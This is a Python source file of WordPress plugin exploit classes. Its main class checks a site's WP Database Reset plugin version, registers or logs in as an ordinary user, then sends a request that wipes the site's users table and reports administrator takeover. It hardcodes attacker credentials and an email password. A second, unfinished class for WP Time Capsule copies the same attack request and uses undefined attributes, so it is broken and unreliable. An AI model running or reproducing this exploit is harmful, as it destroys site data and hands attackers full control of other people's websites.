# Nethanel Gelernter (c)

from wordpress import WPLogs, WPRegisterUser
from http_handler import HTTPWithSession


class WPExploit(object):

    def __init__(self, domain, additional_data=None, proxies=None):
        self._url = str(domain)
        self._additional_data = additional_data
        self._proxies = proxies
        self._logs = WPLogs()
        self._references = list()
        '''
        Keep state of data that is collected and tries that were performed for efficieny
        :param domain:
        :param additional_data: data that might be useful for performing the bruteforce (e.g., login page URL)
        :param proxies: working via HTTP proxies
        '''

    def plugin_name(self):
        '''

        :return: the vulnerable plugin's name
        '''

    def vulnerable_versions(self):
        '''

        :return: string the describes the ranges of vulnerable methods
        '''
        raise NotImplementedError()

    def is_vulnerable_version(self, version_str):
        '''

        :param version_str: X.Y.Z....
        :return: Whether the version is vulnerable or not
        '''
        raise NotImplementedError()

    def get_references(self):
        '''

        :return: list of URLs for data about the exploit & vulnerability (where did you find the data?)
        '''
        return self._references

    def is_vulnerable(self, data=None, proxies=None):
        '''
        Test whether vulnerable or not. If many requests or suspicious requests might be sent, consider adding
        aggresive parameter
        :param data: dictionary with data that can be used for the method
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: Boolean - whether domain is vulnerable or not
        '''
        raise NotImplementedError()

    def exploit(self, data=None, proxies=None):
        '''
        If possible to exploit (E.g., in server-side vulns) - exploit
        In client-side, return the exploit code to use
        :param data: dictionary with data that can be used for the method
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: Boolean - success or not
        '''
        raise NotImplementedError()

    def _save_log(self, e, msg=None, print_error=False):
        if print_error is True:
            print(msg)
        self._logs.save_log(e)
        if msg is not None:
            self._save_log(msg)

    # Feel free to add public method that you consider to be relevant for the users
    # user _ and __ for private and protected methods that should not be used outside the class


class WPPluginExploiter(WPExploit):

    _README_PATH = ""

    def __init__(self, domain):
        super().__init__(domain)
        self._plugin_name = None
        self._plugin_version_start = "Unknown"  # override with the start vulnerable versions
        self._plugin_version_end = "Unknown"  # override with the end vulnerable versions
        self._plugin_version_start_op = " <= "
        self._plugin_version_end_op = " <= "
        self._http = HTTPWithSession()

    def vulnerable_versions(self):
        try:
            if self._plugin_version_start is "Unknown": return "Unknown"
            elif self._plugin_version_end is "Unknown": return "Unknown"
            version = str(self._plugin_version_start)+str(self._plugin_version_start_op)
            version += "Plugin Version"
            version += str(self._plugin_version_end_op)+str(self._plugin_version_end)
            return version
        except Exception as e:
            self._save_log(e, "Error: vulnerable_versions function has crashed, please try again later.")
            return None

    def is_vulnerable_version(self, version_str):
        try:
            start_version = str(self._plugin_version_start).replace(".", "").replace(" ", "")
            end_version = str(self._plugin_version_end).replace(".", "").replace(" ", "")
            test_version = str(version_str).replace(".", "").replace(" ", "")
            max_digits = len(start_version)
            if len(end_version) > max_digits:
                max_digits = len(end_version)
            if len(test_version) > max_digits:
                max_digits = len(test_version)
            start_version = self._build_version(start_version, max_digits)
            end_version = self._build_version(end_version, max_digits)
            test_version = self._build_version(test_version, max_digits)
            if self._plugin_version_start_op is " < " and self._plugin_version_end_op is " < ":
                return start_version < test_version < end_version
            elif self._plugin_version_start_op is " <= " and self._plugin_version_start_op is " < ":
                return  start_version <= test_version < end_version
            elif self._plugin_version_start_op is " < " and self._plugin_version_end_op is " <= ":
                return start_version < test_version <= end_version
            return start_version <= test_version <= end_version
        except Exception as e:
            print("Error: could not parse version.")
            print(e)
            return None

    def is_vulnerable(self, data=None, proxies=None):
        readme = False
        try:
            readme = self._readme_file(proxies)
        except Exception as e:
            self._save_log(e, "Error: find version of plugin with readme file failed.", False)
        return readme

    def _readme_file(self, readme_path=None, proxies=None):
        if readme_path is None:
            readme_path = self._README_PATH
        url = self._url+str(readme_path)
        response = self._http.request(url=url, method="GET", proxies=proxies)
        if response is None:
            return False
        if "Stable tag:" not in response.text:
            return False
        version = response.text.split("Stable tag:")[1].split("\n")[0]  # get the version of the plugin
        return self.is_vulnerable_version(version)

    def exploit(self, data=None, proxies=None):
        raise NotImplementedError()

    def _build_version(self, version, num_of_digits):
        version = str(version)
        version += ("0"*(num_of_digits-len(version)))
        try:
            version = int(version)
            return version
        except Exception as e:
            self._save_log(e, "Error: while parsing version number: "+str(version), True)
            raise e


class WPDatabaseResetExploiter(WPPluginExploiter):

    _USERNAME = "elroattacker"
    _PASS = "123456"
    _EMAIL = "elro@elro.eliranm.co"
    _EMAIL_SERVER = "elro.eliranm.co"
    _EMAIL_PASS = "elroWordpress"
    _README_PATH = "/wp-content/plugins/wordpress-database-reset/readme.txt"

    def __init__(self, domain):
        super().__init__(domain)
        self._plugin_version_start = 0
        self._plugin_version_end = "3.15"
        self._plugin_version_start_op = " <= "
        self._plugin_version_end_op = " < "
        self._references = ['https://www.wordfence.com/blog/2020/01/easily-exploitable-vulnerabilities-patched-in-wp-database-reset-plugin',
                            'https://blog.qualys.com/webappsec/2020/01/24/wordpress-database-reset-plugin-vulnerability-cve-2020-7047-cve-2020-7048',
                            'https://wpvulndb.com/vulnerabilities/10027']

    def exploit(self, data=None, proxies=None):
        """
        :param data: dictionary with data username & password for login, if dictionary is None,
                     the exploit will try to register, with default data.
                     username: will hold the username (for login or register new user)
                     password: will hole the password of the username (for login or register new user)
                     register_page: will hold the url for the register page (for register only)
                     login_page: will hold the url for the login page (for login or register new user)
                     action: "register" for register new user or "login" for login with existing one.
                     cannot send only the username & password => must send all the parameters or None!
        :param proxies: proxies
        :return: boolean => True for success or False for fail
        """
        print("1) Start exploit .... check if possible.")
        self._http.clean_session()
        possible = self.is_vulnerable()
        if possible is False:
            print("\tAttack are not possible on this web-site.")
            return False
        if data is None:
            data = {"username": self._USERNAME, "password": self._PASS,
                    "login_page": self._url+"/wp-login.php",
                    "register_page": self._url+"/wp-login.php?action=register",
                    "action": "register" }
        try:
            print("\tThe attack seems possible")
            print("2) Checking given data...")
            data['mail_server'] = self._EMAIL_SERVER
            data['mail_user'] = self._EMAIL
            data['mail_pass'] = self._EMAIL_PASS
        except Exception as e:
            print("\tFailed to verify data.")
            self._save_log(e, "Error: data is not a dict.", True)
            return False
        try:
            username = data['username']
            password = data['password']
            register_page = data['register_page']
            login_page = data['login_page']
            action = data['action']
        except Exception as e:
            print("\tFailed to verify data.")
            self._save_log(e, "Error: one or more of the data dict parameters is missing.", True)
            return False
        print("\tData is OK!")
        try:
            if data['action'] is "register":
                print("3) Register new user ...")
                possible = self.__register(proxies=proxies, data=data)
                if possible is False:
                    print("\tRegistration Failed, please check the log file.")
                    return False
                print("\tRegistration success...")
            else:
                print("3) Registration is not necessary => skip")
            print("4) Try to log-in")
            possible = self._login(data=data, proxies=proxies)
            if possible is False:
                print("\tLog-in failed please check the log file.")
                return False
            target = self._url + "/wp-admin/admin-post.php?db-reset-tables%5B%5D=users&db-reset-code=11111&db-reset-code-confirm=11111"
            print("\tLogin success")
            print("5) Execute the attack ..")
            possible = self._http.request(url=target, method="GET")
            if possible is None:
                print("\nthe attack is not possible on this web-site")
                return None
            print("\tThe site was hacked, you can login now at: "+login_page)
            print("\tUsername: "+username)
            print("\tPassword: "+password)
            print("\tRole: You have full permissions, you are an administrator")
            return True
        except Exception as e:
            print("\tSomething went wrong, please check the log file")
            self._save_log(e, "Error: failed to attack the web-site.", True)

    def __register(self, data, proxies=None):
        try:
            register = WPRegisterUser()
            return register.register(data, proxies)
        except Exception as e:
            self._save_log(e, "Error: could not complete reiteration.", True)
            return False

    def _login(self, data, proxies=None):
        try:
            username = data['username']
            password = data['password']
            login_page = data['login_page']
        except Exception as e:
            self._save_log(e, "Error: one or more of the login parameters is missing in data dict.", True)
            raise e
        try:
            self._http.clean_session()
            parameters = {'log': username, 'pwd': password, 'wp-submit': 'Login',
                          'testcookie': '1' }
            response = self._http.request(url=login_page, method="POST", params=parameters, proxies=proxies)
            if response is None or "wordpress_logged_in" not in str(response.cookies):
                return False
            return True
        except Exception as e:
            self._save_log(e, "Error: could not login to the web-site.", True)
            return False

# need to finish this class & write UI (params from cli)
class WPTimeCapsuleExploiter(WPPluginExploiter):

    _README_PATH = "/wp-content/plugins/wp-time-capsule/readme.txt"

    def __init__(self, domain):
        super().__init__(domain)
        self._plugin_version_start = 0
        self._plugin_version_end = "1.21.16"
        self._plugin_version_start_op = " <= "
        self._plugin_version_end_op = " < "
        self._references = ['https://wpvulndb.com/vulnerabilities/10010',
                            'https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/',
                            'https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/']

    def exploit(self, data=None, proxies=None):
        print("1) Start exploit .... check if possible.")
        self._http.clean_session()
        possible = self.is_vulnerable()
        if possible is False:
            print("\tAttack are not possible on this web-site.")
            return False
        if data is None:
            data = {"username": self._USERNAME, "password": self._PASS,
                    "login_page": self._url+"/wp-login.php",
                    "register_page": self._url+"/wp-login.php?action=register",
                    "action": "register" }
        try:
            print("\tThe attack seems possible")
            print("2) Checking given data...")
            data['mail_server'] = self._EMAIL_SERVER
            data['mail_user'] = self._EMAIL
            data['mail_pass'] = self._EMAIL_PASS
        except Exception as e:
            print("\tFailed to verify data.")
            self._save_log(e, "Error: data is not a dict.", True)
            return False
        try:
            username = data['username']
            password = data['password']
            register_page = data['register_page']
            login_page = data['login_page']
            action = data['action']
        except Exception as e:
            print("\tFailed to verify data.")
            self._save_log(e, "Error: one or more of the data dict parameters is missing.", True)
            return False
        print("\tData is OK!")
        try:
            if data['action'] is "register":
                print("3) Register new user ...")
                possible = self.__register(proxies=proxies, data=data)
                if possible is False:
                    print("\tRegistration Failed, please check the log file.")
                    return False
                print("\tRegistration success...")
            else:
                print("3) Registration is not necessary => skip")
            print("4) Try to log-in")
            possible = self._login(data=data, proxies=proxies)
            if possible is False:
                print("\tLog-in failed please check the log file.")
                return False
            target = self._url + "/wp-admin/admin-post.php?db-reset-tables%5B%5D=users&db-reset-code=11111&db-reset-code-confirm=11111"
            print("\tLogin success")
            print("5) Execute the attack ..")
            possible = self._http.request(url=target, method="GET")
            if possible is None:
                print("\nthe attack is not possible on this web-site")
                return None
            print("\tThe site was hacked, you can login now at: "+login_page)
            print("\tUsername: "+username)
            print("\tPassword: "+password)
            print("\tRole: You have full permissions, you are an administrator")
            return True
        except Exception as e:
            print("\tSomething went wrong, please check the log file")
            self._save_log(e, "Error: failed to attack the web-site.", True)

    def __register(self, data, proxies=None):
        try:
            register = WPRegisterUser()
            return register.register(data, proxies)
        except Exception as e:
            self._save_log(e, "Error: could not complete reiteration.", True)
            return False

    def _login(self, data, proxies=None):
        try:
            username = data['username']
            password = data['password']
            login_page = data['login_page']
        except Exception as e:
            self._save_log(e, "Error: one or more of the login parameters is missing in data dict.", True)
            raise e
        try:
            self._http.clean_session()
            parameters = {'log': username, 'pwd': password, 'wp-submit': 'Login',
                          'testcookie': '1' }
            response = self._http.request(url=login_page, method="POST", params=parameters, proxies=proxies)
            if response is None or "wordpress_logged_in" not in str(response.cookies):
                return False
            return True
        except Exception as e:
            self._save_log(e, "Error: could not login to the web-site.", True)
            return False

